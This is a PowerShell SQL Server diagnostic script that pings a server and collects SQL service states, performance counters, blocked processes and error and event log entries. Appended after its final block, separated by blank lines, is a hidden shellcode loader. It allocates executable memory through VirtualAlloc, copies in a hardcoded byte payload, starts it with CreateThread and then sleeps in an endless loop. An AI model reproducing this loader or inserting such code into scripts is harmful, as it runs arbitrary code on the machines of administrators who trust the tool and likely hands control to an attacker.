Clear-Host
[Reflection.Assembly]::LoadWithPartialName("Microsoft.SqlServer.Smo")

[int]$numOfPerfmonCollections = 2
[int]$intervalOfCollections = 2


$physicalcounters =  ("\Memory\Available MBytes") `
	,("\PhysicalDisk(_Total)\Avg. Disk sec/Read")`
	,("\PhysicalDisk(_Total)\Avg. Disk sec/Write")  `
	,("\Processor(_Total)\% Processor Time") 
	

$sqlCounterTemplate =  ("\[instancekey]:SQL Statistics\Batch Requests/sec") `
				,("\[instancekey]:Access Methods\Workfiles Created/sec")`
				,("\[instancekey]:Buffer Manager\Page life expectancy")



function Get-SQLCounters{
	param([string] $SQLServerToMonitor, $counters)
	$counterArray = @() 
	
	[int]$instPos = $SQLServerToMonitor.IndexOf("\");
	if($instPos -gt 0){ 
		$instPos += 1;
		$instancekey = "MSSQL$" + $SQLServerToMonitor.Substring($instPos,($SQLServerToMonitor.Length - $instPos))
	} else { 
		$instancekey = "SQLServer"
	}
	
	foreach($cnter in $counters) {
		$counterArray += $cnter.Replace("[instancekey]",$instancekey)
	}
 	return $counterArray;
}


function Invoke-Sqlcmd3
{
    param(
    [string]$ServerInstance,
    [string]$Query
    )
	$QueryTimeout=30
    $conn=new-object System.Data.SqlClient.SQLConnection
	$constring = "Server=" + $ServerInstance + ";Integrated Security=True"
	$conn.ConnectionString=$constring
    	$conn.Open()
		if($conn){
    	$cmd=new-object system.Data.SqlClient.SqlCommand($Query,$conn)
    	$cmd.CommandTimeout=$QueryTimeout
    	$ds=New-Object system.Data.DataSet
    	$da=New-Object system.Data.SqlClient.SqlDataAdapter($cmd)
    	[void]$da.fill($ds)
    	$conn.Close()
    	$ds.Tables[0]
	}
}



$server = Read-Host -Prompt "Specify a server" 


[int]$hourThreshold = Read-Host -Prompt "Number of Hours to Check in Logs"

[datetime] $DatetoCheck = (Get-Date).AddHours(-1 * $hourThreshold)
[string]$sysprocessQuery = @"
	SELECT spid,blocked,open_tran,waittime,lastwaittype,waitresource,dbid
	,cpu,physical_io,memusage,hostname 
	FROM master..sysprocesses 
	WHERE blocked != 0  
	order by spid
"@

if(Test-Connection -ComputerName $server)
{
	Write-Host "$server pinged successfully"
} else {
	Write-Host "$server could not be pinged!"
	break;
}


$SQLServices = Get-WmiObject -ComputerName $server win32_service | 
		Where-Object {$_.name -like "*SQL*" } |
		Select-Object Name,StartMode,State,Status 
 
 if($SQLServices.Count -gt 0) {
	$SQLServices | Out-GridView -Title "$server SQL Services Information"
	}




	Write-Host "Reading OS Perf Counters...."
	try{
		$sqlCounters = Get-Counter -ComputerName $server -Counter $physicalcounters `
								-MaxSamples $numOfPerfmonCollections -SampleInterval $intervalOfCollections
	} catch {
		Write-Host "Problem Reading Perf Counters" + $Error
	}
	


Foreach($sqlService in $SQLServices | 
			Where-Object{$_.name -like "MSSQL$*" -or $_.name -eq "MSSQLSERVER"} |
			Where-Object{$_.State -eq "Running"  } )
{
	[string]$sqlServerName = $sqlService.Name
	$sqlServerName = $sqlServerName.Replace("MSSQL$","$server\")
	$sqlServerName = $sqlServerName.Replace("MSSQLSERVER","$server")
	
	Write-host "Checking $sqlServerName"
	$sqlServer = New-Object("Microsoft.SqlServer.Management.Smo.Server") $sqlServerName	 
	
	
	try{
		$tbl = Invoke-Sqlcmd3 -Query $sysprocessQuery -ServerInstance $sqlServerName |
			Where-Object {$_.blocked -ne "0"} | 
			Out-GridView -Title "$sqlServerName Blocked Processes"
	}
	catch{
		Write-Host "Problem Reading SysProcesses" + $Error
	}
	
	
	Write-Host "Reading SQL Log for $sqlServerName"
	try{
		$sqlServer.ReadErrorLog() |	Where{$_.LogDate -is [datetime] } | 
				Where-Object{$_.LogDate -gt $DatetoCheck } | 
				Where-Object{$_.Text -like "*Error*" -or $_.Text -like "*Fail*"} |
				Select-Object LogDate,Text |
				Out-GridView -Title "$sqlServerName Log Errors"
	} catch {
		Write-Host "Error Reading $sqlServer.Name"
	}
	
	
	try{
		$sqlInstanceCounters = Get-SQLCounters -SQLServerToMonitor $sqlServerName -counters $sqlCounterTemplate
	} catch {
		Write-Host "Error Building SQL Counter Template $_"
	}
	
	try{
		$sqlCounters += Get-Counter -ComputerName $server -Counter $sqlInstanceCounters `
						-MaxSamples $numOfPerfmonCollections -SampleInterval $intervalOfCollections 
	} catch {
		Write-Host "Error getting SQL Counters $_"
	}						
	
} 

	
	$sqlCounters | ForEach-Object{ $_.CounterSamples | Select-Object  Path, CookedValue } |
		Out-GridView -Title "$sqlServer Perfmon Counters"

	try{
	Write-Host "Reading Event Logs..."
	
	$systemLog = Get-EventLog -ComputerName $server `
		-EntryType "Error" -LogName "System" -After $DatetoCheck |
		Select-Object TimeGenerated,Source,Message 
		
	$appLog = Get-EventLog -ComputerName $server `
		-EntryType "Error" -LogName "Application" -After $DatetoCheck |
		Select-Object TimeGenerated,Source,Message 
		
	if($systemLog.Count -gt 0) {$serverLogs += $systemLog}	
	if($appLog.Count -gt 0) {$serverLogs += $appLog}	
	
	if($serverLogs.Count -gt 0) { $serverLogs | Out-GridView -Title "$server Event Logs" }

} catch {
	Write-Host "Problem Reading Server Event Logs:" + $Error
}








$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x01,0xbd,0x77,0x57,0xda,0xdd,0xd9,0x74,0x24,0xf4,0x58,0x2b,0xc9,0xb1,0x47,0x31,0x50,0x13,0x03,0x50,0x13,0x83,0xe8,0xfd,0x5f,0x82,0xab,0x15,0x1d,0x6d,0x54,0xe5,0x42,0xe7,0xb1,0xd4,0x42,0x93,0xb2,0x46,0x73,0xd7,0x97,0x6a,0xf8,0xb5,0x03,0xf9,0x8c,0x11,0x23,0x4a,0x3a,0x44,0x0a,0x4b,0x17,0xb4,0x0d,0xcf,0x6a,0xe9,0xed,0xee,0xa4,0xfc,0xec,0x37,0xd8,0x0d,0xbc,0xe0,0x96,0xa0,0x51,0x85,0xe3,0x78,0xd9,0xd5,0xe2,0xf8,0x3e,0xad,0x05,0x28,0x91,0xa6,0x5f,0xea,0x13,0x6b,0xd4,0xa3,0x0b,0x68,0xd1,0x7a,0xa7,0x5a,0xad,0x7c,0x61,0x93,0x4e,0xd2,0x4c,0x1c,0xbd,0x2a,0x88,0x9a,0x5e,0x59,0xe0,0xd9,0xe3,0x5a,0x37,0xa0,0x3f,0xee,0xac,0x02,0xcb,0x48,0x09,0xb3,0x18,0x0e,0xda,0xbf,0xd5,0x44,0x84,0xa3,0xe8,0x89,0xbe,0xdf,0x61,0x2c,0x11,0x56,0x31,0x0b,0xb5,0x33,0xe1,0x32,0xec,0x99,0x44,0x4a,0xee,0x42,0x38,0xee,0x64,0x6e,0x2d,0x83,0x26,0xe6,0x82,0xae,0xd8,0xf6,0x8c,0xb9,0xab,0xc4,0x13,0x12,0x24,0x64,0xdb,0xbc,0xb3,0x8b,0xf6,0x79,0x2b,0x72,0xf9,0x79,0x65,0xb0,0xad,0x29,0x1d,0x11,0xce,0xa1,0xdd,0x9e,0x1b,0x5f,0xdb,0x08,0x08,0xb0,0xd1,0x44,0x38,0xb3,0x15,0x70,0x08,0x3a,0xf3,0x28,0x3a,0x6d,0xac,0x88,0xea,0xcd,0x1c,0x60,0xe1,0xc1,0x43,0x90,0x0a,0x08,0xec,0x3a,0xe5,0xe5,0x44,0xd2,0x9c,0xaf,0x1f,0x43,0x60,0x7a,0x5a,0x43,0xea,0x89,0x9a,0x0d,0x1b,0xe7,0x88,0xf9,0xeb,0xb2,0xf3,0xaf,0xf4,0x68,0x99,0x4f,0x61,0x97,0x08,0x18,0x1d,0x95,0x6d,0x6e,0x82,0x66,0x58,0xe5,0x0b,0xf3,0x23,0x91,0x73,0x13,0xa4,0x61,0x22,0x79,0xa4,0x09,0x92,0xd9,0xf7,0x2c,0xdd,0xf7,0x6b,0xfd,0x48,0xf8,0xdd,0x52,0xda,0x90,0xe3,0x8d,0x2c,0x3f,0x1b,0xf8,0xac,0x03,0xca,0xc4,0xda,0x6d,0xce;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

